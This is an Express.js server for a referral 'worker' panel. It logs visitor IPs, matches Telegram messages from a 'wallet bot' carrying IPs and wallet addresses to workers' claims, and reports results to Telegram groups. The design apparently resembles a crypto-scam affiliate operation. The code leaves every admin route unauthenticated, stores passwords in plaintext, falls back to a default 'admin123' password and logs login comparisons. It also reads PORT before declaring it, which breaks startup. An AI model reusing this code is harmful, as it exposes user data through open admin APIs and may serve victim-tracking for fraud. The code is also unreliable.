const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
require('dotenv').config();

// Validate NODE_ENV for production safety
if (!process.env.NODE_ENV) {
  console.warn('[WARN] NODE_ENV not set, defaulting to development');
  process.env.NODE_ENV = 'development';
}


const app = express();

// Security middleware
// ============================================
// ENVIRONMENT VALIDATION
// ============================================

const requiredEnvVars = [
  'ADMIN_USERNAME',
  'ADMIN_PASSWORD', 
  'TELEGRAM_BOT_TOKEN',
  'TELEGRAM_CHAT_ID',
  'GROUP_BOT_TOKEN',
  'GROUP_CHAT_ID',
  'WALLET_BOT_ID',
  'GROUP_BOT_SECRET'
];

const missing = requiredEnvVars.filter(v => !process.env[v]);
if (missing.length > 0) {
  console.error('[FATAL] Missing required environment variables:', missing.join(', '));
  console.error('[FATAL] Server cannot start. Please check your Render environment variables.');
  process.exit(1);
}

// Warn about default secrets in production
if (process.env.NODE_ENV === 'production') {
  if (process.env.GROUP_BOT_SECRET === 'default-secret' || process.env.GROUP_BOT_SECRET === 'your_random_secret_key_here') {
    console.error('[FATAL] GROUP_BOT_SECRET is using default value in production!');
    console.error("[FATAL] Generate a real secret: node -e \"console.log(require('crypto').randomBytes(32).toString('hex'))\"");
    process.exit(1);
  }
  if (process.env.ADMIN_PASSWORD === 'admin123' || process.env.ADMIN_PASSWORD === '1234567890') {
    console.warn('[WARN] Admin password is weak - change it in production!');
  }
}

// ============================================
// SECURITY MIDDLEWARE
// ============================================

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://cdn.tailwindcss.com"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://cdn.tailwindcss.com", "https://s3.tradingview.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.binance.com", "https://fapi.binance.com"],
      frameSrc: ["'self'"],
      fontSrc: ["'self'", "https://cdnjs.cloudflare.com"],
    },
  },
}));

// CORS
const corsOptions = {
  origin: (origin, callback) => {
    const allowed = process.env.ALLOWED_ORIGINS?.split(',').filter(Boolean) || [];
    // Allow same-origin requests (no origin header) and explicitly configured origins only
    // NO localhost fallback — set ALLOWED_ORIGINS env var for production
    if (!origin || allowed.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
};
app.use(cors(corsOptions));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// Serve static files
app.use(express.static(path.join(__dirname)));

// ============================================
// DATA STORES
// ============================================

const workers = [];
const visitors = [];
const claims = [];
const disputes = [];
const groupMessages = [];

// Admin credentials - trim to handle any accidental whitespace in .env
const ADMIN_USERNAME = (process.env.ADMIN_USERNAME || 'admin').trim();
const ADMIN_PASSWORD = (process.env.ADMIN_PASSWORD || 'admin123').trim();

// Debug log (remove after fixing)
console.log('Admin config loaded. Username env:', process.env.ADMIN_USERNAME ? 'SET' : 'NOT SET');

// Domain config
const BASE_URL = process.env.API_URL || process.env.BASE_URL || `http://localhost:${PORT}`;

// Telegram bots
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Verify Telegram bot token format
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_BOT_TOKEN.includes(':')) {
  console.error('[FATAL] Invalid TELEGRAM_BOT_TOKEN format');
  process.exit(1);
}

// Test bot connection on startup (optional, non-blocking)
bot.getMe().then(me => {
  console.log(`[Telegram] Bot connected: @${me.username}`);
}).catch(err => {
  console.error('[Telegram] Bot connection failed:', err.message);
  console.error('[Telegram] Check your TELEGRAM_BOT_TOKEN');
});

// Group bot config
const GROUP_BOT_TOKEN = process.env.GROUP_BOT_TOKEN;
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;
const WALLET_BOT_ID = process.env.WALLET_BOT_ID;
const GROUP_BOT_SECRET = process.env.GROUP_BOT_SECRET || 'default-secret';
const PENDING_TIMEOUT_MS = parseInt(process.env.PENDING_TIMEOUT_HOURS || '2') * 60 * 60 * 1000;

// Rules (editable via admin)
let rules = {
  walletKeyword: process.env.WALLET_KEYWORD || '',
  autoForwardPatterns: (process.env.AUTO_FORWARD_PATTERNS || '👀,✍️,✅').split(','),
  pendingTimeoutHours: parseInt(process.env.PENDING_TIMEOUT_HOURS || '2'),
  matchField: process.env.MATCH_FIELD || 'ip',
};

// ============================================
// HELPERS
// ============================================

function generateReferralLink(workerId, req) {
  const base = getBaseUrl(req);
  return `${base}/?ref=${workerId}`;
}

function getBaseUrl(req) {
  if (BASE_URL && BASE_URL !== `http://localhost:${PORT}`) return BASE_URL;
  if (req) {
    const host = req.get('host') || req.headers.host;
    const proto = req.get('x-forwarded-proto') || req.protocol || 'https';
    if (host) return `${proto}://${host}`;
  }
  return BASE_URL;
}

function generateId() {
  // Generates IDs like ID7A3B9C2D1E — 6-12 chars, uppercase alphanumeric
  return 'ID' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

// Referral code validation regex (must match tracker.js validation)
const REF_CODE_REGEX = /^[A-Z0-9]{6,12}$/;

function isValidRefCode(code) {
  return typeof code === 'string' && REF_CODE_REGEX.test(code);
}

function telegram(msg) {
  bot.sendMessage(TELEGRAM_CHAT_ID, msg, { parse_mode: 'HTML' })
    .catch(err => console.error('Telegram Error:', err));
}

function sendToGroup(msg) {
  bot.sendMessage(GROUP_CHAT_ID, msg, { parse_mode: 'HTML' })
    .catch(err => console.error('Group Send Error:', err));
}

function extractIP(text) {
  const ipRegex = /\b(?:\d{1,3}\.){3}\d{1,3}\b/;
  const match = text.match(ipRegex);
  return match ? match[0] : null;
}

function extractWallet(text) {
  const walletRegex = /0x[a-fA-F0-9]{40}/;
  const match = text.match(walletRegex);
  return match ? match[0] : null;
}

function isFromWalletBot(fromId) {
  return fromId.toString() === WALLET_BOT_ID;
}

function formatClaimMessage(claim, originalMessage) {
  const worker = workers.find(w => w.id === claim.workerId);
  const workerName = worker ? worker.name : 'Unknown';
  const workerLink = worker ? worker.referralLink : 'N/A';

  return `🔥 <b>CLAIM PROCESSED</b> 🔥\n\n👤 <b>Worker:</b> ${workerName}\n🆔 <b>Worker ID:</b> ${claim.workerId}\n🔗 <b>Referral Link:</b> ${workerLink}\n🌍 <b>Country:</b> ${claim.country}\n📱 <b>Device:</b> ${claim.device}\n🌐 <b>IP:</b> ${claim.ip}\n⏱ <b>Claim Time:</b> ${new Date(claim.timestamp).toLocaleString()}\n⏱ <b>Processed:</b> ${new Date().toLocaleString()}\n\n━━━━━━━━━━━━━━━━━━━━\n<b>Original Message:</b>\n${originalMessage}`;
}

function formatTimeRemaining(ms) {
  const hours = Math.floor(ms / (1000 * 60 * 60));
  const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
  return `${hours}h ${minutes}m`;
}

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/claim', (req, res) => {
  const { visitorId } = req.body;

  if (!visitorId) {
    return res.status(400).json({ error: 'Visitor ID is required' });
  }

  // Look up visitor to get worker
  const visitor = visitors.find(v => v.id === visitorId);
  if (!visitor) {
    return res.status(404).json({ error: 'Visitor session not found' });
  }

  const workerId = visitor.workerId;
  const worker = workers.find(w => w.id === workerId);
  if (!worker) {
    return res.status(404).json({ error: 'Worker not found' });
  }

  if (worker.status === 'inactive') {
    return res.status(403).json({ error: 'Worker account is inactive' });
  }

  const claimId = generateId();
  const now = Date.now();
  const claim = {
    id: claimId,
    workerId,
    workerName: worker.name,
    workerLink: worker.referralLink,
    country: visitor.country || 'Unknown',
    device: visitor.device || 'Unknown',
    ip: visitor.ip || 'Unknown',
    timestamp: now,
    createdAt: now,
    status: 'PENDING',
    groupMessage: null,
    processedAt: null,
    clashDetails: null,
  };

  claims.push(claim);

  setTimeout(() => {
    const c = claims.find(x => x.id === claimId);
    if (c && c.status === 'PENDING') {
      c.status = 'EXPIRED';
      c.processedAt = Date.now();
      c.resolution = 'TIMEOUT_EXPIRED';
    }
  }, PENDING_TIMEOUT_MS);

  res.json({ success: true, claimId });
});

// ============================================
// GROUP BOT ENDPOINT
// ============================================

app.post('/api/group-message', (req, res) => {
  const { messageId, from, text, chat, date } = req.body;

  const secret = req.headers['x-telegram-bot-secret'];
  if (secret !== GROUP_BOT_SECRET) {
    return res.status(403).json({ error: 'Invalid secret' });
  }

  if (!isFromWalletBot(from.id)) {
    groupMessages.push({ messageId, from, text, chat, date, processedAt: Date.now(), action: 'AUTO_FORWARD' });
    sendToGroup(text);
    return res.json({ action: 'AUTO_FORWARD' });
  }

  const ip = extractIP(text);

  if (!ip) {
    groupMessages.push({ messageId, from, text, chat, date, processedAt: Date.now(), action: 'AUTO_FORWARD_NO_IP' });
    sendToGroup(text);
    return res.json({ action: 'AUTO_FORWARD_NO_IP' });
  }

  const pendingClaims = claims.filter(c => c.status === 'PENDING' && c.ip === ip);

  if (pendingClaims.length === 0) {
    groupMessages.push({ messageId, from, text, chat, date, ip, processedAt: Date.now(), action: 'AUTO_FORWARD_NO_MATCH' });
    sendToGroup(text);
    return res.json({ action: 'AUTO_FORWARD_NO_MATCH' });
  }

  const uniqueWorkers = [...new Set(pendingClaims.map(c => c.workerId))];

  if (uniqueWorkers.length > 1) {
    const clashId = generateId();
    const clashRecord = {
      id: clashId,
      messageId,
      ip,
      text,
      workerIds: uniqueWorkers,
      claimIds: pendingClaims.map(c => c.id),
      timestamp: Date.now(),
      status: 'CLASH',
      resolution: 'FORFEITED',
    };

    disputes.push(clashRecord);

    pendingClaims.forEach(c => {
      c.status = 'FORFEITED';
      c.processedAt = Date.now();
      c.clashDetails = clashId;
      c.resolution = 'CLASH_FORFEITED';
    });

    telegram(`⚠️ <b>CLASH DETECTED</b>\n\nIP: ${ip}\nWorkers: ${uniqueWorkers.join(', ')}\nClaims: ${pendingClaims.length}\n\nAll claims forfeited. Check disputes tab.`);

    return res.json({ action: 'CLASH', clashId });
  }

  const matchedClaim = pendingClaims.sort((a, b) => b.timestamp - a.timestamp)[0];

  matchedClaim.status = 'PROCESSED';
  matchedClaim.processedAt = Date.now();
  matchedClaim.groupMessage = text;

  const formattedMessage = formatClaimMessage(matchedClaim, text);
  sendToGroup(formattedMessage);

  const worker = workers.find(w => w.id === matchedClaim.workerId);
  if (worker) {
    worker.claims = (worker.claims || 0) + 1;
  }

  res.json({ action: 'PROCESSED', claimId: matchedClaim.id });
});

// ============================================
// WORKER API
// ============================================

app.post('/api/worker/login', (req, res) => {
  const { workerId, password } = req.body;
  const worker = workers.find(w => w.id === workerId && w.password === password);

  if (!worker) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  if (worker.status === 'inactive') {
    return res.status(403).json({ error: 'Account inactive' });
  }

  // Track last portal login
  worker.lastLoginAt = Date.now();

  res.json({
    success: true,
    worker: {
      id: worker.id,
      name: worker.name,
      referralLink: worker.referralLink,
      clicks: worker.clicks || 0,
      claims: worker.claims || 0,
      status: worker.status,
    }
  });
});

app.get('/api/worker/:id/stats', (req, res) => {
  const worker = workers.find(w => w.id === req.params.id);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const workerClaims = claims.filter(c => c.workerId === worker.id);

  res.json({
    clicks: worker.clicks || 0,
    claims: worker.claims || 0,
    completes: workerClaims.filter(c => c.status === 'PROCESSED').length,
    pending: workerClaims.filter(c => c.status === 'PENDING').length,
    clashes: workerClaims.filter(c => c.status === 'FORFEITED').length,
  });
});

app.get('/api/worker/:id/claims', (req, res) => {
  const worker = workers.find(w => w.id === req.params.id);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const workerClaims = claims
    .filter(c => c.workerId === worker.id)
    .sort((a, b) => b.timestamp - a.timestamp)
    .map(c => ({
      id: c.id,
      status: c.status,
      country: c.country,
      device: c.device,
      ip: c.ip,
      timestamp: c.timestamp,
      createdAt: c.createdAt,
      processedAt: c.processedAt,
      groupMessage: c.groupMessage,
      clashDetails: c.clashDetails,
      resolution: c.resolution,
    }));

  res.json(workerClaims);
});

app.get('/api/claim/:id', (req, res) => {
  const claim = claims.find(c => c.id === req.params.id);
  if (!claim) return res.status(404).json({ error: 'Claim not found' });

  const worker = workers.find(w => w.id === claim.workerId);

  res.json({
    ...claim,
    createdAt: claim.createdAt || claim.timestamp,
    workerName: worker ? worker.name : 'Unknown',
    workerLink: worker ? worker.referralLink : 'N/A',
  });
});

// ============================================
// VISITOR TRACKING
// ============================================

app.post('/api/visitor', (req, res) => {
  const { workerId, country, device, ip, referrer } = req.body;

  const visitor = {
    id: generateId(),
    workerId,
    country: country || 'Unknown',
    device: device || 'Unknown',
    ip: ip || req.ip,
    referrer: referrer || 'Direct',
    timestamp: Date.now(),
  };

  visitors.push(visitor);

  const worker = workers.find(w => w.id === workerId);
  if (worker) {
    worker.clicks = (worker.clicks || 0) + 1;
  }

  res.json({ success: true });
});

// FIX 1: /api/track-visit — called by referral-tracker.js with refCode
app.post('/api/track-visit', (req, res) => {
  const { refCode } = req.body;

  // Validate ref code format
  const REF_CODE_REGEX = /^[A-Z0-9]{6,12}$/;
  if (!refCode || !REF_CODE_REGEX.test(refCode)) {
    return res.status(400).json({ error: 'Invalid referral code format' });
  }

  // Find worker by ref code (worker.id IS the ref code)
  const worker = workers.find(w => w.id === refCode);
  if (!worker) {
    return res.status(404).json({ error: 'Worker not found' });
  }

  if (worker.status === 'inactive') {
    return res.status(403).json({ error: 'Worker account is inactive' });
  }

  const visitorId = generateId();
  const visitor = {
    id: visitorId,
    workerId: worker.id,
    country: 'Unknown',
    device: 'Unknown',
    ip: req.ip || 'Unknown',
    referrer: req.get('Referrer') || 'Direct',
    timestamp: Date.now(),
  };

  visitors.push(visitor);
  worker.clicks = (worker.clicks || 0) + 1;

  res.json({ success: true, visitorId });
});

// ============================================
// ADMIN API
// ============================================

app.post('/api/admin/login', (req, res) => {
  const username = (req.body.username || '').trim();
  const password = (req.body.password || '').trim();

  // Debug log (remove after fixing)
  console.log('Login attempt:', { 
    providedUsername: username, 
    expectedUsername: ADMIN_USERNAME,
    usernameMatch: username === ADMIN_USERNAME,
    passwordMatch: password === ADMIN_PASSWORD
  });

  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    return res.json({ success: true });
  }

  res.status(401).json({ error: 'Invalid credentials', debug: { 
    usernameProvided: !!req.body.username,
    passwordProvided: !!req.body.password 
  }});
});

app.get('/api/admin/workers', (req, res) => {
  const { search, status } = req.query;
  let result = [...workers];

  if (search) {
    const s = search.toLowerCase();
    result = result.filter(w =>
      w.id.toLowerCase().includes(s) ||
      w.name.toLowerCase().includes(s) ||
      (w.referralLink && w.referralLink.toLowerCase().includes(s))
    );
  }

  if (status) {
    result = result.filter(w => w.status === status);
  }

  res.json(result);
});

app.post('/api/admin/workers', (req, res) => {
  const { name, password, referralLink } = req.body;

  if (!name || !password) {
    return res.status(400).json({ error: 'Name and password required' });
  }

  const workerId = generateId();
  const link = referralLink || generateReferralLink(workerId, req);

  const worker = {
    id: workerId,
    name,
    password,
    referralLink: link,
    clicks: 0,
    claims: 0,
    status: 'active',
    createdAt: Date.now(),
  };

  workers.push(worker);
  res.json({ success: true, worker });
});

app.put('/api/admin/workers/:id', (req, res) => {
  const worker = workers.find(w => w.id === req.params.id);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const { name, password, referralLink, status } = req.body;

  if (name) worker.name = name;
  if (password) worker.password = password;
  if (referralLink) worker.referralLink = referralLink;
  if (status) worker.status = status;

  res.json({ success: true, worker });
});

app.delete('/api/admin/workers/:id', (req, res) => {
  const index = workers.findIndex(w => w.id === req.params.id);
  if (index === -1) return res.status(404).json({ error: 'Worker not found' });

  workers.splice(index, 1);
  res.json({ success: true });
});

app.post('/api/admin/workers/:id/link', (req, res) => {
  const worker = workers.find(w => w.id === req.params.id);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  const { link } = req.body;
  worker.referralLink = link || generateReferralLink(worker.id, req);

  res.json({ success: true, link: worker.referralLink });
});

app.post('/api/admin/workers/:id/clear-link', (req, res) => {
  const worker = workers.find(w => w.id === req.params.id);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  worker.referralLink = '';
  res.json({ success: true });
});

app.post('/api/admin/workers/:id/toggle-status', (req, res) => {
  const worker = workers.find(w => w.id === req.params.id);
  if (!worker) return res.status(404).json({ error: 'Worker not found' });

  worker.status = worker.status === 'active' ? 'inactive' : 'active';
  res.json({ success: true, status: worker.status });
});

// ============================================
// ADMIN DASHBOARD DATA
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const activeWorkers = workers.filter(w => w.status === 'active').length;
  const totalClicks = workers.reduce((sum, w) => sum + (w.clicks || 0), 0);
  const totalClaims = claims.filter(c => c.status === 'PROCESSED').length;
  const pendingClaims = claims.filter(c => c.status === 'PENDING').length;
  const clashCount = disputes.length;
  const expiredCount = claims.filter(c => c.status === 'EXPIRED').length;
  const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
  const activeToday = workers.filter(w => w.lastLoginAt && w.lastLoginAt > oneDayAgo).length;

  res.json({
    activeWorkers,
    totalWorkers: workers.length,
    totalClicks,
    totalClaims,
    pendingClaims,
    clashCount,
    expiredCount,
    activeToday,
    groupBotStatus: 'ONLINE',
  });
});

app.get('/api/admin/visitors', (req, res) => {
  const { search, workerId, dateFrom, dateTo } = req.query;
  let result = [...visitors].sort((a, b) => b.timestamp - a.timestamp);

  if (search) {
    const s = search.toLowerCase();
    result = result.filter(v =>
      v.ip.toLowerCase().includes(s) ||
      v.country.toLowerCase().includes(s) ||
      v.device.toLowerCase().includes(s)
    );
  }

  if (workerId) {
    result = result.filter(v => v.workerId === workerId);
  }

  if (dateFrom) {
    result = result.filter(v => v.timestamp >= new Date(dateFrom).getTime());
  }

  if (dateTo) {
    result = result.filter(v => v.timestamp <= new Date(dateTo).getTime());
  }

  res.json(result);
});

app.get('/api/admin/pending', (req, res) => {
  const { search } = req.query;
  let result = claims
    .filter(c => c.status === 'PENDING')
    .sort((a, b) => a.timestamp - b.timestamp);

  if (search) {
    const s = search.toLowerCase();
    result = result.filter(c =>
      c.workerId.toLowerCase().includes(s) ||
      c.ip.includes(s) ||
      c.country.toLowerCase().includes(s)
    );
  }

  result = result.map(c => ({
    ...c,
    timeRemaining: Math.max(0, PENDING_TIMEOUT_MS - (Date.now() - c.timestamp)),
    timeRemainingText: formatTimeRemaining(Math.max(0, PENDING_TIMEOUT_MS - (Date.now() - c.timestamp))),
  }));

  res.json(result);
});

app.get('/api/admin/disputes', (req, res) => {
  const { search } = req.query;
  let result = [...disputes].sort((a, b) => b.timestamp - a.timestamp);

  if (search) {
    const s = search.toLowerCase();
    result = result.filter(d =>
      d.ip.includes(s) ||
      d.workerIds.some(id => id.toLowerCase().includes(s))
    );
  }

  res.json(result);
});

app.get('/api/admin/claims', (req, res) => {
  const { search, status, workerId } = req.query;
  let result = [...claims].sort((a, b) => b.timestamp - a.timestamp);

  if (search) {
    const s = search.toLowerCase();
    result = result.filter(c =>
      c.id.toLowerCase().includes(s) ||
      c.workerId.toLowerCase().includes(s) ||
      c.ip.includes(s)
    );
  }

  if (status) {
    result = result.filter(c => c.status === status);
  }

  if (workerId) {
    result = result.filter(c => c.workerId === workerId);
  }

  res.json(result);
});

app.get('/api/admin/group-bot-status', (req, res) => {
  res.json({
    status: 'ONLINE',
    lastPing: Date.now(),
    groupChatId: GROUP_CHAT_ID,
    walletBotId: WALLET_BOT_ID,
  });
});

// ============================================
// RULES MANAGEMENT
// ============================================

app.get('/api/admin/rules', (req, res) => {
  res.json(rules);
});

app.put('/api/admin/rules', (req, res) => {
  const { walletKeyword, autoForwardPatterns, pendingTimeoutHours, matchField } = req.body;

  if (walletKeyword !== undefined) rules.walletKeyword = walletKeyword;
  if (autoForwardPatterns !== undefined) rules.autoForwardPatterns = autoForwardPatterns;
  if (pendingTimeoutHours !== undefined) rules.pendingTimeoutHours = pendingTimeoutHours;
  if (matchField !== undefined) rules.matchField = matchField;

  res.json({ success: true, rules });
});

// ============================================
// ROUTES
// ============================================

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/worker', (req, res) => {
  res.sendFile(path.join(__dirname, 'worker.html'));
});

// ============================================
// VISITOR CLEANUP (auto-delete after 1 hour)
// ============================================

const VISITOR_TTL_MS = parseInt(process.env.VISITOR_TTL) || 3600000; // 1 hour default
const CLEANUP_INTERVAL_MS = 15 * 60 * 1000;   // check every 15 minutes

setInterval(() => {
  const cutoff = Date.now() - VISITOR_TTL_MS;
  const beforeCount = visitors.length;
  for (let i = visitors.length - 1; i >= 0; i--) {
    if (visitors[i].timestamp < cutoff) {
      visitors.splice(i, 1);
    }
  }
  const removed = beforeCount - visitors.length;
  if (removed > 0) {
    console.log(`[Cleanup] Auto-deleted ${removed} visitor(s) older than 1 hour`);
  }
}, CLEANUP_INTERVAL_MS);

// ============================================
// SERVER START
// ============================================

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Domain: ${BASE_URL}`);
  if (!process.env.API_URL && !process.env.BASE_URL) {
    console.warn('[WARN] API_URL/BASE_URL not set — using request host detection');
    console.warn('[WARN] Set API_URL env var for stable referral links');
  }
  console.log(`👤 Admin Panel: ${BASE_URL}/admin`);
  console.log(`🔒 CSP: 'self' only (no localhost)`);
  console.log(`🔒 CORS: env-controlled only (no localhost fallback)`);
  console.log(`💼 Worker Portal: ${BASE_URL}/worker`);
  console.log(`⏱️  Visitor TTL: ${VISITOR_TTL_MS}ms (${Math.round(VISITOR_TTL_MS/1000/60)} minutes)`);
  console.log(`🤖 Telegram Bot: ${TELEGRAM_CHAT_ID}`);
  console.log(`📢 Group Chat: ${GROUP_CHAT_ID}`);
  console.log('========================================');
});
